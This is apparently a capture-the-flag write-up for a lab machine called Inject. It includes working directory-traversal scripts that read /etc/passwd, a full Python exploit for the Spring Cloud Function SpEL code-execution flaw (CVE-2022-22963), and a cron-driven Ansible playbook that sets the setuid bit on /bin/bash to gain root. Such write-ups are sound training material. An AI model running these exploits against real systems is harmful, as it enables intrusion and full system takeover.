# Inject (Easy)  

## Nmap  

```
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  nagios-nsca syn-ack ttl 63 Nagios NSCA
```  

## Http 8080  

We have two usernames posted on the /blogs section.  

```
admin
Brandon Auger
```  

Once uploading an image, I noticed the following path with a url parameter.  

`http://10.129.252.5:8080/show_image?img=some-image.jpg`  

Path to upload folder.  

`/var/www/WebApp/src/main/uploads`  

## Directory Traversal  

Using the following script.  

```bash
#!/bin/bash

#
# Usage:
# ./dir-trav.sh 10.129.252.153 8080 show_image?img=
#

IP="$1"

PORT="$2"

REMOTE_PATH="$3"

FILE="etc/passwd"

PREV="../"


for num in $(seq 1 10);
do
    FULL="http://$IP:$PORT/$REMOTE_PATH$PREV$FILE"
    echo "$FULL"
    curl -s --path-as-is "$FULL"
    PREV+="../"
    echo "=========================================="
done
```  

Returns the etc file.  

Scanning web root script.  

```bash
#!/bin/bash

for purple in $(cat /usr/share/dirb/wordlists/common.txt);
do

result=$(curl -s --path-as-is "http://10.129.253.55:8080/show_image?img=../../../../../../var/www/WebApp/$purple")

grep -v "Internal Server Error" <<< $result

done

```  

Results of /var/www/WebApp/  

```
main
test
.DS_Store
classes
generated-sources
generated-test-sources
maven-archiver
maven-status
spring-webapp.jar
spring-webapp.jar.original
surefire-reports
test-classes
```  

Results of /var/www/WebApp/src/  

```
java
resources
uploads
java
```  

Results of /var/www/WebApp/src/main/  

```
com
META-INF
application.properties
media
META-INF
static
templates
```  



## Users  

Finding the following users with a valid shell.  

```
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
frank:x:1000:1000:frank:/home/frank:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
```  

## cve-2022-22963 exploit  

```python
# Google Dork: intext:"Spring Cloud Function SPeL"

import requests
import sys
import urllib3
urllib3.disable_warnings()

def rce(ip, cmd):

    payload=f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'
    data = 'd'
    headers = {
        'spring.cloud.function.routing-expression':payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',

    }

    uri = f'http://{ip}/functionRouter'

    try:
        req = requests.post(url=uri,headers=headers,data=data,verify=False,timeout=3)
        text = req.text
        response = '"error":"Internal Server Error"'
        if response in text:
            print(f'[+] Host is vulnerable')
            print(f'[+] Command executed')
            print(f'[+] Exploit completed')
        else:
            print(f'[-] {uri} not vulnerable')
    except requests.exceptions.RequestException:
        print('[-] Request timed out')
    except:
        print(f'[-] Error in {uri}')
        
if __name__ == '__main__' :
    if len(sys.argv) < 3:
        print('Usage:')
        print(f'python3 {sys.argv[0]} <IP> command')
        print('Example: python3 exploit.py 10.10.10.10 whoami')
        exit()
    rce(sys.argv[1], sys.argv[2])
```

## Priv esc  

In /home/frank/.m2/settings.xml the following creds were found.  

```
User: phil
Password: DocPhillovestoInject123
```

As phil, /opt/automation/tasks is writable, there is a yaml file being run by a cron process.  

```
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
```  

Adding the following to a new yaml file and getting root by running '/bin/bash -p'.  

`echo -e "- hosts: localhost\n  tasks:\n  - name: priv\n    command: sudo chmod +s /bin/bash" > playbook_2.yml`
